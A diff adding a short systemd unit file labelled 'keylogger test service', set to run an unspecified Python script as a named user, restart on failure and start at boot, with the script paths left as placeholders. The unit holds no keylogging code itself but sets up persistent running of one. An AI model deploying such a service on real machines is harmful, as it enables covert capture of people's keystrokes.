@@ -1,0 +1,15 @@
+[Unit]
+Description=keylogger test service
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=hussam
+ExecStart='path to python interpreter' 'path to the script'
+Environment=DISPLAY=:1
+
+[Install]
+WantedBy=multi-user.target
